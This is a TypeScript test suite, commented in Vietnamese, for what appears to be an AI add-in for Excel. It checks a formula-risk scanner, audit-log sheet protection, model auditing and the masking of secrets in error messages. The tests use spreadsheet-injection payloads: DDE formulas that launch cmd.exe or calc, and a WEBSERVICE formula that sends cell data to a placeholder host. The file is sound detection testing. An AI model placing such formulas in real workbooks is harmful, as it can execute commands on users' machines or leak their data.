/** Đợt 4 · Các ca từ lần soát mã độc lập 16/11/2026 (tasks/dot/dot-4/bang-chung/soat-ma-doc-lap.md). Số trong tên kiểm thử là số phát hiện. */
import * as assert from "assert";
import { LOG_SHEET, isLogSheet, namesSheet, targetsLogSheet } from "../../src/core/auditlog";
import { findFormulaRisks, formulaRisksOf } from "../../src/core/formularisk";
import { auditModel, embeddedRates } from "../../src/core/modelaudit";
import { goalSeek } from "../../src/core/goalseek";
import { ApiError, describeError, explainApiError, isRetryable, maskSecrets } from "../../src/core/errors";
import { cellAddress, normalize2D, sanitizeSheetName, splitAreas } from "../../src/office/util";
import { excelTools } from "../../src/office/excelTools";
import { withAuditTrail } from "../../src/office/excelTrail";
import { PROVIDERS } from "../../src/core/providers";

const risks = (f: string) => formulaRisksOf(f).map((x) => x.what);

describe("Đợt 4 · Soát mã · Giải ngược", () => {
  it("#1 Mục tiêu = 0 với đầu ra cỡ tỷ đồng (hòa vốn, NPV = 0): tìm được, không báo 'chưa hội tụ'", async () => {
    const f1 = (x: number) => 2.5e7 * Math.pow(x, 1.01) - 9.13e10;
    const a = await goalSeek(async (x) => f1(x), { target: 0, start: 1000 });
    assert.ok(a.ok, a.reason);
    assert.ok(Math.abs(f1(a.x)) < 1e-3 * 9.13e10);
    const f2 = (x: number) => 1e9 * Math.pow(1 + x, 7) - 2.345e9;
    const b = await goalSeek(async (x) => f2(x), { target: 0, start: 0.05 });
    assert.ok(b.ok, b.reason);
    assert.ok(Math.abs(b.x - (Math.pow(2.345, 1 / 7) - 1)) < 1e-6);
  });

  it("#14 min / max dạng chuỗi vẫn có hiệu lực", async () => {
    const r = await goalSeek(async (x) => 3 * x + 10, { target: 100, start: 5, min: "0" as any, max: "10" as any });
    assert.ok(!r.ok, "nghiệm 30 nằm ngoài khoảng 0–10 nên phải báo không tìm được");
    const ok = await goalSeek(async (x) => 3 * x + 10, { target: 100, start: 5, min: "0" as any, max: "50" as any });
    assert.ok(ok.ok && Math.abs(ok.x - 30) < 1e-3);
  });
});

describe("Đợt 4 · Soát mã · Công thức cần hỏi", () => {
  it("#2 values tới dưới dạng chuỗi JSON: quét trên khối đã chuẩn hóa (đúng khối sẽ ghi) thì bắt được", () => {
    const raw = '[["=WEBSERVICE(\\"http://x/\\"&A1)"]]';
    assert.strictEqual(findFormulaRisks(raw).length, 0, "quét chuỗi thô không thấy — vì thế excelRisk phải chuẩn hóa trước");
    assert.strictEqual(findFormulaRisks(normalize2D(raw)).length, 1);
    const src = require("fs").readFileSync(require("path").join(__dirname, "../../src/office/excelAdvanced.ts"), "utf8");
    assert.match(src, /formulaRiskMessage\(vals,/);
    assert.match(src, /const vals = normalize2D\(a\.values\)/);
  });

  it("#4 DDE ở mọi vị trí trong công thức", () => {
    for (const f of ["=cmd|'/c calc'!A1", "+cmd|'/c calc'!A1", "-cmd|'/c calc'!A1", "=1+cmd|'/c calc'!A1", "=10+20+cmd|' /C calc'!A0", "@SUM(1)+cmd|'/c calc'!A1", "='cmd'|'/c calc'!A1", "=MSEXCEL|'\\..\\..\\Windows\\System32\\cmd.exe'!''"])
      assert.ok(risks(f).includes("liên kết DDE"), f);
    for (const f of ['=IF(A1="a|b",1,2)', '="x|y"!', "=A1+B1"]) assert.ok(!risks(f).includes("liên kết DDE"), f);
  });

  it("#17 Liên kết tệp ngoài: không báo nhầm tham chiếu bảng dạng [2024], [1]; bắt [Book1]Sheet1!, tên vùng của tệp khác", () => {
    for (const f of ["=SUM([2024])+Sheet2!A1", "=[2025]-[2024]+'Giả định'!B2", "=IF([1]>0,[1]*Sheet2!A1,0)", "=SUM(Bảng1[Doanh thu])+Sheet2!A1", "=[@[Đơn giá]]*'Giả định'!B2"])
      assert.ok(!risks(f).includes("liên kết tệp ngoài"), f);
    for (const f of ["=[Book1]Sheet1!A1", "='C:\\Du an\\Ngan sach.xlsx'!TongVon", "=NganSach.xlsx!TongVon", "=[Budget.xlsx]Sheet1!A1+1", "=SUM([2]Data!A1:A9)", "='C:\\Du an\\[Ngan sach.xlsx]Tong hop'!$B$4"])
      assert.ok(risks(f).includes("liên kết tệp ngoài"), f);
  });

  it("#23 #24 #25 Gạch đầu dòng không phải công thức; HYPERLINK nội bộ ghép tên sheet không hỏi; có FILTERXML và REGISTER", () => {
    assert.deepStrictEqual(risks("- Họp call (9h) với đối tác"), []);
    assert.deepStrictEqual(risks("- Image (hình 3) minh họa"), []);
    assert.deepStrictEqual(risks("+ INDIRECT (xem ghi chú)"), []);
    assert.ok(risks("-INDIRECT(A1)").includes("INDIRECT"));
    assert.ok(risks("+WEBSERVICE(A1)").includes("WEBSERVICE"));
    assert.deepStrictEqual(risks('=HYPERLINK("#\'"&A2&"\'!A1",A2)'), []);
    assert.ok(risks('=HYPERLINK(SUBSTITUTE(B1,"x",C1),"Mở")').includes("HYPERLINK"));
    assert.ok(risks('=FILTERXML(WEBSERVICE(A1),"//a")').includes("FILTERXML"));
    assert.ok(risks('=REGISTER("user32","MessageBoxA","JJCCJ")').some((w) => /REGISTER/.test(w)));
    assert.deepStrictEqual(risks("=CALLS!A1+RECALL(1)+UNREGISTERED(2)"), []);
  });

  it("Công cụ ghi và công cụ làm sạch trả câu hỏi thật khi gọi kiểm rủi ro (không chỉ có hàm)", async () => {
    const spec = excelTools.specs.find((s) => s.name === "excel_clean_data")!;
    const dup = await spec.risky!({ action: "remove_duplicates", address: "A1:D8", columns: ["A"] });
    assert.match(dup!, /Xóa các dòng trùng/);
    assert.match(dup!, /không quá 10\.000 ô/);
    // #16 Thay hàng loạt bằng công thức có hàm cần hỏi (Excel.run không có ngoài Office → phần đếm báo không kiểm được, phần công thức vẫn hỏi)
    (globalThis as any).Excel = { run: async () => Promise.reject(new Error("ngoài Office")) };
    try {
      const rep = await spec.risky!({ action: "replace_all", address: "A1:D8", find: "x", replace: '=WEBSERVICE("http://x/"&A1)' });
      assert.match(rep!, /WEBSERVICE/);
      // B3 (4.11.13): không đếm được số ô sẽ bị thay thì hỏi, không cho chạy im lặng
      assert.match((await spec.risky!({ action: "replace_all", address: "A1:D8", find: "Chờ", replace: "Xong" }))!, /Không kiểm được/);
    } finally {
      delete (globalThis as any).Excel;
    }
    assert.match((await excelTools.specs.find((s) => s.name === "excel_named_range")!.risky!({ action: "delete", name: "X" }))!, /#NAME\?/);
    assert.match((await excelTools.specs.find((s) => s.name === "excel_edit_chart")!.risky!({ delete: true }))!, /KHÔNG hoàn tác/);
    assert.strictEqual(await excelTools.specs.find((s) => s.name === "excel_edit_chart")!.risky!({ title: "x" }), null);
  });
});

describe("Đợt 4 · Soát mã · Kiểm toán mô hình", () => {
  const run = (g: any[][]) => auditModel({ r1c1: g, origin: { col: 0, row: 0 }, addr: cellAddress });
  it("#13 Không báo nhầm: hàng số nhập tay giữa hai hàng công thức, cột nhập tay xen cột công thức, hàng năm giữa hai bảng", () => {
    const rowInput = [
      ["Giá", 100, "=RC[-1]*1.05", "=RC[-1]*1.05", "=RC[-1]*1.05"],
      ["Số căn", 10, 12, 14, 16],
      ["Phí", 5, "=RC[-1]*1.05", "=RC[-1]*1.05", "=RC[-1]*1.05"],
    ];
    assert.strictEqual(run(rowInput).counts.hardcoded, 0);
    const colInput = [
      ["KH1", "TH1", "KH2", "TH2", "KH3"],
      ["=RC[5]*2", 10, "=RC[5]*2", 11, "=RC[5]*2"],
      ["=RC[5]*2", 20, "=RC[5]*2", 21, "=RC[5]*2"],
      ["=RC[5]*2", 30, "=RC[5]*2", 31, "=RC[5]*2"],
    ];
    assert.strictEqual(run(colInput).counts.hardcoded, 0);
    const years = [
      ["=SUM(R[-5]C:R[-1]C)", "=SUM(R[-5]C:R[-1]C)", "=SUM(R[-5]C:R[-1]C)"],
      [2024, 2025, 2026],
      ["=SUM(R[-5]C:R[-1]C)", "=SUM(R[-5]C:R[-1]C)", "=SUM(R[-5]C:R[-1]C)"],
    ];
    assert.strictEqual(run(years).counts.hardcoded, 0);
    // Một ô gõ đè lẻ loi vẫn bị bắt
    const one = [["Giá", 100, "=RC[-1]*1.05", 118, "=RC[-1]*1.05", "=RC[-1]*1.05"]];
    assert.deepStrictEqual(run(one).findings.filter((f) => f.kind === "hardcoded").map((f) => f.cell), ["D1"]);
  });

  it("#19 Tỷ lệ đứng sau 'số nguyên,' được thấy; phần trăm trong tên cột của bảng không tính", () => {
    assert.deepStrictEqual(embeddedRates("=MAX(0,0.2*B2)"), ["0.2"]);
    assert.deepStrictEqual(embeddedRates("=IF(A1>0,0.05,0.1)"), ["0.05", "0.1"]);
    assert.deepStrictEqual(embeddedRates("=[@[Giá bán]]*[@[VAT 10%]]"), []);
    assert.deepStrictEqual(embeddedRates("=BangGia[Phí bảo trì 2%]*1"), []);
    assert.deepStrictEqual(embeddedRates("=LOG10(B2)+ROUND(C2,2)+A1"), []);
  });
});

describe("Đợt 4 · Soát mã · Sheet nhật ký", () => {
  it("#6 Tên sau khi công cụ làm sạch trùng sheet nhật ký thì bị chặn", () => {
    for (const n of ["Nhật ký AI?", "Nhật ký AI/", "Nhật ký AI:", "[Nhật ký AI]", "''Nhật ký AI''", "  NHẬT KÝ AI  "]) {
      assert.ok(isLogSheet(n), n);
      assert.ok(isLogSheet(sanitizeSheetName(n)), "sau làm sạch: " + n);
    }
    assert.ok(targetsLogSheet({ name: "Nhật ký AI?" }));
    assert.ok(targetsLogSheet({ action: "rename", sheet: "Sheet1", new_name: "Nhật ký AI/" }));
    assert.ok(!isLogSheet("Nhật ký AI 2") && !isLogSheet("Nhật ký"));
  });

  it("#20 Tên sheet có dấu phẩy trong nháy không bị cắt ngang", () => {
    assert.deepStrictEqual(splitAreas("'Quý 1, 2026'!A1:D5"), ["'Quý 1, 2026'!A1:D5"]);
    assert.deepStrictEqual(splitAreas("C2:D13, F2:F13"), ["C2:D13", "F2:F13"]);
    assert.deepStrictEqual(splitAreas("'A, b'!A1,'Nhật ký AI'!B2"), ["'A, b'!A1", "'Nhật ký AI'!B2"]);
    assert.ok(targetsLogSheet({ address: "'A, b'!A1,'Nhật ký AI'!B2" }));
    assert.ok(!targetsLogSheet({ address: "'Quý 1, Nhật ký AI'!A1" }));
    assert.deepStrictEqual(splitAreas(""), []);
  });

  /** Excel giả tối thiểu: ghi lại các sheet được thêm và nội dung ghi */
  function fakeExcel(active: string) {
    const added: string[] = [];
    const writes: any[] = [];
    const range = () => {
      const r: any = { format: { font: {}, fill: {}, wrapText: false }, load: () => r };
      Object.defineProperty(r, "values", { set: (v) => { writes.push(v); } });
      return r;
    };
    const sheet = (name: string, isNull = false): any => ({
      name,
      isNullObject: isNull,
      load: () => undefined,
      getRange: range,
      activate: () => undefined,
      freezePanes: { freezeRows: () => undefined },
      getUsedRangeOrNullObject: () => ({ load: () => undefined, isNullObject: true }),
    });
    (globalThis as any).Excel = {
      run: async (fn: any) =>
        fn({
          sync: async () => undefined,
          workbook: {
            worksheets: {
              getActiveWorksheet: () => sheet(active),
              getItemOrNullObject: (n: string) => sheet(n, !added.includes(n)),
              add: (n: string) => (added.push(n), sheet(n)),
            },
          },
        }),
    };
    return { added, writes };
  }
  const baseTools = (calls: string[]): any => ({
    host: "Excel",
    specs: [
      { name: "excel_write_range", description: "", parameters: {}, write: true },
      { name: "excel_sheet", description: "", parameters: {}, write: true },
      { name: "excel_insert_delete", description: "", parameters: {}, write: true },
      { name: "excel_get_overview", description: "", parameters: {} },
    ],
    execute: async (name: string) => {
      calls.push(name);
      if (name === "excel_get_overview") return { sheets: [{ name: LOG_SHEET, firstRows: [["bí mật"]] }] };
      return { ok: true };
    },
    overview: async () => ({}),
    systemPrompt: () => "",
  });

  it("#5 Lệnh không nêu sheet khi người dùng đang đứng ở sheet nhật ký: bị chặn; đứng ở sheet khác: chạy", async () => {
    try {
      const calls: string[] = [];
      fakeExcel(LOG_SHEET);
      const t = withAuditTrail(baseTools(calls), { settings: () => ({}), describe: (c) => c.name });
      await assert.rejects(() => t.execute("excel_write_range", { address: "A1", values: [["x"]] }, { log: [] }), /nhật ký/);
      await assert.rejects(() => t.execute("excel_sheet", { action: "rename", new_name: "X" }, { log: [] }), /nhật ký/);
      await assert.rejects(() => t.execute("excel_insert_delete", { action: "delete_rows", at: "2" }, { log: [] }), /nhật ký/);
      assert.deepStrictEqual(calls, []);
      fakeExcel("Sheet1");
      await t.execute("excel_write_range", { address: "A1", values: [["x"]] }, { log: [] });
      assert.deepStrictEqual(calls, ["excel_write_range"]);
      assert.ok(namesSheet({ sheet: "S" }) && namesSheet({ address: "S!A1" }) && !namesSheet({ address: "A1" }) && !namesSheet({ action: "rename" }));
    } finally {
      delete (globalThis as any).Excel;
    }
  });

  it("#7 Bật nhật ký: ghi thì có dòng nhật ký; xóa chính sheet nhật ký thì KHÔNG tạo lại sheet; Hoàn tác ghi thêm dòng", async () => {
    try {
      const calls: string[] = [];
      const fx = fakeExcel("Sheet1");
      const log: any[] = [];
      const base = baseTools(calls);
      const exec0 = base.execute;
      base.execute = async (name: string, _a: any, ctx: any) => {
        if (name === "excel_write_range") ctx.log.push({ label: "Ghi S!A1", undo: async () => undefined });
        return exec0(name);
      };
      const t = withAuditTrail(base, { settings: () => ({ excelLog: true }), describe: (c) => "Ghi " + c.args.address, now: () => new Date(2026, 10, 16, 8, 0, 0) });
      await t.execute("excel_write_range", { sheet: "S", address: "A1", values: [["1"]] }, { log, said: "lý do", request: "yêu cầu" });
      assert.deepStrictEqual(fx.added, [LOG_SHEET]);
      const row = fx.writes[fx.writes.length - 1][0];
      assert.deepStrictEqual([row[1], row[2]], ["S", "A1"]);
      assert.match(row[5], /Ghi A1 — lý do/);
      assert.strictEqual(row[6], "yêu cầu");
      const n = fx.writes.length;
      await log[0].undo();
      assert.strictEqual(fx.writes.length, n + 1);
      assert.match(fx.writes[n][0][5], /^Hoàn tác: Ghi S!A1/);
      // Xóa sheet nhật ký: không ghi thêm gì, không thêm lại sheet
      const before = fx.writes.length;
      fx.added.length = 0;
      await t.execute("excel_sheet", { action: "delete", sheet: LOG_SHEET }, { log });
      assert.deepStrictEqual(fx.added, []);
      assert.strictEqual(fx.writes.length, before);
    } finally {
      delete (globalThis as any).Excel;
    }
  });

  it("#34 Công cụ excel_get_overview cũng không trả nội dung sheet nhật ký cho model", async () => {
    const t = withAuditTrail(baseTools([]), { settings: () => ({}), describe: (c) => c.name });
    const r = await t.execute("excel_get_overview", {}, { log: [] });
    assert.deepStrictEqual(r.sheets[0].firstRows, []);
  });
});

describe("Đợt 4 · Soát mã · Lỗi nhà cung cấp", () => {
  const groq = PROVIDERS.find((p) => p.id === "groq")!;
  it("#3 Câu 413 của Groq với tên model có dấu chấm vẫn ra câu tiếng Việt và lý do too_large", () => {
    for (const m of ["llama-3.3-70b-versatile", "llama-3.1-8b-instant", "openai/gpt-oss-20b"]) {
      const d = `Request too large for model \`${m}\` in organization \`org_01abcdefghjkmnpqrstvwxyz12\` service tier \`on_demand\` on tokens per minute (TPM): Limit 12000, Requested 14210, please reduce your message size and try again.`;
      const x = explainApiError(413, d, { provider: groq });
      assert.strictEqual(x.reason, "too_large", m);
      assert.match(x.text, /14\.210 token/);
      assert.ok(!x.text.includes("org_01"));
      assert.strictEqual(isRetryable(new ApiError(x.text, 413, undefined, x.reason)), false);
    }
  });

  it("429 hết hạn mức phút thật (yêu cầu nhỏ hơn trần) đi qua ensureOk-kiểu explainApiError vẫn tự thử lại được", () => {
    const d = "Rate limit reached for model `llama-3.3-70b-versatile` in organization `org_01abcdefghjkmnpqrstvwxyz12` on tokens per minute (TPM): Limit 12000, Used 11000, Requested 2000. Please try again in 5s.";
    const x = explainApiError(429, d, { provider: groq });
    assert.strictEqual(x.reason, undefined);
    assert.ok(isRetryable(new ApiError(x.text, 429, undefined, x.reason)));
    assert.ok(!x.text.includes("org_01abc"));
  });

  it("#21 maskSecrets: che mã tổ chức / dự án (hoa thường, có gạch nối giữa); không che chữ thường gặp", () => {
    for (const s of ["org_01abcdefghjkmnpqrstvwxyz12", "ORG-AbCdEfGh12345678", "Org_01ABCDEFGHJKMNPQ", "proj_AbCdEfGh1234XyZ9", "org-abcd1234-efgh5678-ijkl"]) assert.ok(!maskSecrets(`x ${s} y`).includes(s.slice(6)), s);
    for (const s of ["project_management_2026", "project-specific", "org_settings", "project_timeline2026", "organization-wide", "org_abc ngắn", "proj_2026"]) assert.strictEqual(maskSecrets(s), s, s);
    assert.ok(!describeError(new ApiError("in organization `org_01abcdefghjkmnpqrstvwxyz12`", 400)).detail.includes("01abcdefgh"));
  });
});
